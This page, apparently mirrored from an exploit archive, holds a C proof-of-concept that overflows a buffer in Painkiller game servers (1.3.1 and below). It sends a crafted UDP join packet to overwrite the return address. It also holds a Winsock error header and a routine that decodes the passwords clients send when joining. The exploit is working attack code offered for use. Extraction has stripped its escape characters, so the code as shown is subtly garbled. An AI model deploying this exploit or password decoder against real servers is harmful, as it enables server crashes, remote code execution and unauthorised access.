<html>
<head>
<title>Painkiller versions 1.3.1 and below exploit</title>
<pre>
/* 

by Luigi Auriemma 

*/ 

#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;string.h&gt; 

#ifdef WIN32 
    #include &lt;winsock.h&gt; 
    #include &quot;winerr.h&quot; 

    #define close   closesocket 
#else 
    #include &lt;unistd.h&gt; 
    #include &lt;sys/socket.h&gt; 
    #include &lt;sys/types.h&gt; 
    #include &lt;arpa/inet.h&gt; 
    #include &lt;netdb.h&gt; 
#endif 



#define VER         &quot;0.1&quot; 
#define BUFFSZ       2048 
#define PORT         3455 
#define TIMEOUT     3 
#define GAMEVER     &quot;1.3&quot; 
#define INFO         &quot;xfexfdx00xDExADxC0xDExffxffxff&quot; 
#define CONN         &quot;xffxffxffxffx02&quot; 
#define JOIN1       &quot;xffxffxffxffx04&quot; 
                    GAMEVER   &quot;&quot; 
                    &quot;105.263&quot; &quot;&quot; 
#define JOIN2       &quot;x00x00x00x00&quot; &quot;xdexadxc0xde&quot; 
#define BOOMSZ       548 
#define RETBACKOFF   28 

#define SENDRECV(x) 
    if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer)) 
      &lt; 0) std_err(); 
    if(timeout(sd) &lt; 0) { 
        fputs(&quot;nError: socket timeout, no answer receivedn&quot;, stdout); 
        exit(1); 
    } 
    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); 
    if(len &lt; 0) std_err(); 
    buff[len] = 0x00; 




void show_info(u_char *buff, int len); 
u_long check_ret_addr(char *data); 
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 




int main(int argc, char *argv[]) { 
    int         sd, 
                len; 
    u_short     port = PORT; 
    u_char       buff[BUFFSZ + 1], 
                *ptr; 
    struct   sockaddr_in peer; 
    u_long       ret_addr; 


    setbuf(stdout, NULL); 

    fputs(&quot;n&quot; 
        &quot;Painkiller &lt;= 1.31 code execution bug &quot;VER&quot;n&quot; 
        &quot;by Luigi Auriemman&quot; 
        &quot;e-mail: aluigi@altervista.orgn&quot; 
        &quot;web:     http://aluigi.altervista.orgn&quot; 
        &quot;n&quot;, stdout); 

    if(argc &lt; 3) { 
        printf(&quot;n&quot; 
            &quot;Usage: %s &lt;ret_addr&gt; &lt;host&gt; [port(%d)]n&quot; 
            &quot;n&quot; 
            &quot; ret_addr is a memory address where you want to point the code flow.n&quot; 
            &quot; I have implemented only the ret_addr of the dedicated server because then&quot; 
            &quot; normal game needs a different one, so the dedicated server crashs but you cann&quot; 
            &quot; also choose a return address (EIP) while the normal game simply crashs.n&quot; 
            &quot; ret_addr is automatically verified by this PoC because only the bytes fromn&quot; 
            &quot; 0x00 to 0x3f are allowed.n&quot; 
            &quot; If you don't know what to use, insert: 0x32103210 or 0x33333333n&quot; 
            &quot; Some addresses like 0x11111111 instead freeze the server with CPU at 100%%n&quot; 
            &quot;n&quot;, argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32 
    WSADATA     wsadata; 
    WSAStartup(MAKEWORD(1,0), &amp;wsadata); 
#endif 

    ret_addr = check_ret_addr(argv[1]); 

    if(argc &gt; 3) port = atoi(argv[3]); 
    peer.sin_addr.s_addr = resolv(argv[2]); 
    peer.sin_port         = htons(port); 
    peer.sin_family       = AF_INET; 

    printf(&quot;n&quot; 
        &quot;- Target                   %s:%hun&quot; 
        &quot;- Real return address:     %sn&quot; 
        &quot;- Encoded return address:   0x%08lxn&quot;, 
        inet_ntoa(peer.sin_addr), 
        port, 
        argv[1], 
        ret_addr); 

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
    if(sd &lt; 0) std_err(); 

    fputs(&quot;- Request informations:n&quot;, stdout); 
    SENDRECV(INFO); 
    show_info(buff, len); 

    fputs(&quot;- Send connection request packetn&quot;, stdout); 
    SENDRECV(CONN); 
    printf(&quot;- Server challenge: %sn&quot;, buff + 5); 

    ptr = (u_char *)memcpy(buff, JOIN1, sizeof(JOIN1) - 1) + 
        sizeof(JOIN1) - 1; 

    ptr = (u_char *)memset(ptr, '0', 72) + 72;   // Gamespy key auth 
    *ptr++ = 0x00;                               // key auth delimiter 

    ptr = (u_char *)memset(ptr, 'a', BOOMSZ) + BOOMSZ; 
    *(u_long *)(ptr - RETBACKOFF) = ret_addr;   // dedicated server ret_addr 
    *ptr++ = 0x00;                               // password delimiter 

    ptr = (u_char *)memcpy(ptr, JOIN2, sizeof(JOIN2) - 1) + 
        sizeof(JOIN2) - 1; 

    fputs(&quot;- Send BOOM packet with return address overwritingn&quot;, stdout); 
    if(sendto(sd, buff, ptr - buff, 0, (struct sockaddr *)&amp;peer, sizeof(peer)) 
      &lt; 0) std_err(); 
    if(timeout(sd) &lt; 0) { 
        fputs(&quot;nServer IS vulnerable!!!nn&quot;, stdout); 
    } else { 
        fputs(&quot;nServer doesn't seem to be vulnerablenn&quot;, stdout); 
    } 

    close(sd); 

    return(0); 
} 




void show_info(u_char *buff, int len) { 
    u_char   *p1, 
            *p2, 
            *limit; 
    int     nt = 0; 

    limit = buff + len; 
    p1 = buff + 5; 
    while(p1 &lt; limit) { 
        p2 = strchr(p1, 0x00); 
        if(!p2) break; 
        *p2 = 0x00; 

        if(!nt) { 
            if(p1 == p2) break; 
            printf(&quot;%30s: &quot;, p1); 
            nt++; 
        } else { 
            printf(&quot;%sn&quot;, p1); 
            nt = 0; 
        } 
        p1 = p2 + 1; 
    } 
    fputc('n', stdout); 
} 





u_long check_ret_addr(char *data) { 
    u_long   ret = 0; 
    u_char   *retc; 
    int     tmp, 
            i; 

    retc = ((u_char *)&amp;ret) + 3; 

    if((data[1] == 'x') || (data[1] == 'X')) data += 2; 

    if(strlen(data) != 8) { 
        fputs(&quot;n&quot; 
            &quot;Error: please use a full offset of 4 hex numbers.n&quot; 
            &quot;       For example: 0x12341234, 12341234, 00001234, 0x33333333 and so onn&quot; 
            &quot;n&quot;, stdout); 
        exit(1); 
    } 

    for(i = 0; i &lt; 4; i++) { 
        sscanf(data, &quot;%02x&quot;, &amp;tmp); 
        if(tmp &gt; 0x3f) { 
            printf(&quot;n&quot; 
                &quot;Error: the return address cannot contain bytes greater than 0x3f (your: 0x%02x).n&quot; 
                &quot;       For example 0x12341234 contains 0x12, 0x34, 0x12 and 0x34 that are ok.n&quot; 
                &quot;       While 0x12345678 is not ok because 0x56 and 0x78 are greater than 0x3fn&quot; 
                &quot;n&quot;, tmp); 
            exit(1); 
        } 
        if(tmp &lt;= 9) { 
            *retc = tmp + 0x30; 
        } else if((tmp &gt;= 0xa) &amp;&amp; (tmp &lt;= 0x23)) { 
            *retc = tmp + 0x57; 
        } else { 
            *retc = tmp + 0x1d; 
        } 
        retc--; 
        data += 2; 
    } 

    return(ret); 
} 



int timeout(int sock) { 
    struct   timeval tout; 
    fd_set   fd_read; 
    int     err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&amp;fd_read); 
    FD_SET(sock, &amp;fd_read); 
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout); 
    if(err &lt; 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 



u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf(&quot;nError: Unable to resolv hostname (%s)n&quot;, host); 
            exit(1); 
        } else host_ip = *(u_long *)hp-&gt;h_addr; 
    } 
    return(host_ip); 
} 




#ifndef WIN32 
    void std_err(void) { 
        perror(&quot;nError&quot;); 
        exit(1); 
    } 
#endif
--------------------------------------------------------------------------------



winerr.h 



--------------------------------------------------------------------------------
/* 
  Header file used for manage errors in Windows 
  It support socket and errno too 
  (this header replace the previous sock_errX.h) 
*/ 

#include &lt;string.h&gt; 
#include &lt;errno.h&gt; 



void std_err(void) { 
    char     *error; 

    switch(WSAGetLastError()) { 
        case 10004: error = &quot;Interrupted system call&quot;; break; 
        case 10009: error = &quot;Bad file number&quot;; break; 
        case 10013: error = &quot;Permission denied&quot;; break; 
        case 10014: error = &quot;Bad address&quot;; break; 
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break; 
        case 10024: error = &quot;Too many open files&quot;; break; 
        case 10035: error = &quot;Operation would block&quot;; break; 
        case 10036: error = &quot;Operation now in progress&quot;; break; 
        case 10037: error = &quot;Operation already in progress&quot;; break; 
        case 10038: error = &quot;Socket operation on non-socket&quot;; break; 
        case 10039: error = &quot;Destination address required&quot;; break; 
        case 10040: error = &quot;Message too long&quot;; break; 
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break; 
        case 10042: error = &quot;Bad protocol option&quot;; break; 
        case 10043: error = &quot;Protocol not supported&quot;; break; 
        case 10044: error = &quot;Socket type not supported&quot;; break; 
        case 10045: error = &quot;Operation not supported on socket&quot;; break; 
        case 10046: error = &quot;Protocol family not supported&quot;; break; 
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break; 
        case 10048: error = &quot;Address already in use&quot;; break; 
        case 10049: error = &quot;Can't assign requested address&quot;; break; 
        case 10050: error = &quot;Network is down&quot;; break; 
        case 10051: error = &quot;Network is unreachable&quot;; break; 
        case 10052: error = &quot;Net dropped connection or reset&quot;; break; 
        case 10053: error = &quot;Software caused connection abort&quot;; break; 
        case 10054: error = &quot;Connection reset by peer&quot;; break; 
        case 10055: error = &quot;No buffer space available&quot;; break; 
        case 10056: error = &quot;Socket is already connected&quot;; break; 
        case 10057: error = &quot;Socket is not connected&quot;; break; 
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break; 
        case 10059: error = &quot;Too many references, can't splice&quot;; break; 
        case 10060: error = &quot;Connection timed out&quot;; break; 
        case 10061: error = &quot;Connection refused&quot;; break; 
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break; 
        case 10063: error = &quot;File name too long&quot;; break; 
        case 10064: error = &quot;Host is down&quot;; break; 
        case 10065: error = &quot;No Route to Host&quot;; break; 
        case 10066: error = &quot;Directory not empty&quot;; break; 
        case 10067: error = &quot;Too many processes&quot;; break; 
        case 10068: error = &quot;Too many users&quot;; break; 
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break; 
        case 10070: error = &quot;Stale NFS file handle&quot;; break; 
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break; 
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break; 
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break; 
        case 10071: error = &quot;Too many levels of remote in path&quot;; break; 
        case 11001: error = &quot;Host not found&quot;; break; 
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break; 
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break; 
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break; 
        default: error = strerror(errno); break; 
    } 
    fprintf(stderr, &quot;nError: %sn&quot;, error); 
    exit(1); 
} 

--------------------------------------------------------------------------------



painkiller_pckpwd.h 



--------------------------------------------------------------------------------
/* 

Painkiller packet's password encoder/decoder 0.1 
by Luigi Auriemma 
e-mail: aluigi@altervista.org 
web:     http://aluigi.altervista.org 


INTRODUCTION 
============ 
When you want to join a password protected game server of Painkiller 
(http://www.painkillergame.com) your client sends a packet containing 
the packet ID (0x04), your client version, the 72 bytes of the Gamespy 
auth key (http://aluigi.altervista.org/papers/gskey-auth.txt) plus a 
&quot;strange&quot; text string after it. 
This text string is just the password you have used to join and it is 
encrypted using the other text string (the server challenge) sent by 
the server in its previous packet. 
My optimized algorithm is able to decode/encode the password stored in 
the packet sent by the client. 


HOW TO USE 
========== 
The function is an algorithm used for both encoding and decoding 
without differences. 
It needs only 2 parameters: 
- pwd: the client's password stored in the packet 
- enc: the server challenge string 

Example: 
  #include &quot;painkiller_pckpwd.h&quot; 

    unsigned char   pwd[] = &quot;5mjblOpV8N&quot;, 
                    enc[] = &quot;k7bEv4cGcw&quot;; 
    painkiller_pckpwd(pwd, enc); 
    printf(&quot;Password: %sn&quot;, pwd);   // the password is &quot;mypassword&quot; 


LICENSE 
======= 
    Copyright 2004 Luigi Auriemma 

    This program is free software; you can redistribute it and/or modify 
    it under the terms of the GNU General Public License as published by 
    the Free Software Foundation; either version 2 of the License, or 
    (at your option) any later version. 

    This program is distributed in the hope that it will be useful, 
    but WITHOUT ANY WARRANTY; without even the implied warranty of 
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   See the 
    GNU General Public License for more details. 

    You should have received a copy of the GNU General Public License 
    along with this program; if not, write to the Free Software 
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA   02111-1307 USA 

    http://www.gnu.org/licenses/gpl.txt 

*/ 



void painkiller_pckpwd(unsigned char *pwd, unsigned char *enc) { 
    unsigned char   buff[64], 
                    encbuff[64], 
                    *p1, 
                    *p2; 
    int             len, 
                    i, 
                    cl, 
                    dl, 
                    esi, 
                    edi; 

    p1 = pwd; 
    while(1) { 
        if((*p1 &gt;= '0') &amp;&amp; (*p1 &lt;= '9')) { 
            *p1 -= 0x30; 
        } else if((*p1 &gt;= 'a') &amp;&amp; (*p1 &lt;= 'z')) { 
            *p1 -= 0x57; 
        } else if((*p1 &gt;= 'A') &amp;&amp; (*p1 &lt;= '')) { 
            *p1 -= 0x1d; 
        } else { 
            break; 
        } 
        p1++; 
    } 
    len = p1 - pwd; 

    p1 = buff; 
    for(i = 0; i &lt; 64; i++) { 
        *p1++ = i; 
    } 

    p1 = enc; 
    p2 = encbuff; 
    for(i = 0; i &lt; 64; i++) { 
        *p2++ = *p1++; 
        if(!*p1) p1 = enc; 
    } 

    p1 = buff; 
    p2 = encbuff; 
    for(i = esi = 0; i &lt; 64; i++) { 
        cl = *p1; 
        esi = (*p2 + cl + esi) &amp; 63; 
        *p1++ = buff[esi]; 
        buff[esi] = cl; 
        p2++; 
    } 

    esi = edi = 0; 
    p1 = pwd; 
    for(i = 0; i &lt; len; i++) { 
        esi = (esi + 1) &amp; 63; 
        cl = buff[esi]; 
        edi = (cl + edi) &amp; 63; 
        dl = buff[edi]; 
        buff[esi] = dl; 
        buff[edi] = cl; 
        *p1++ ^= buff[(dl + cl) &amp; 63]; 
    } 

    p1 = pwd; 
    while(len--) { 
        if(*p1 &lt;= 9) { 
            *p1 += 0x30; 
        } else if((*p1 &gt;= 0xa) &amp;&amp; (*p1 &lt;= 0x23)) { 
            *p1 += 0x57; 
        } else { 
            *p1 += 0x1d; 
        } 
        p1++; 
    } 
} </pre>
//milw0rm.com
</html>

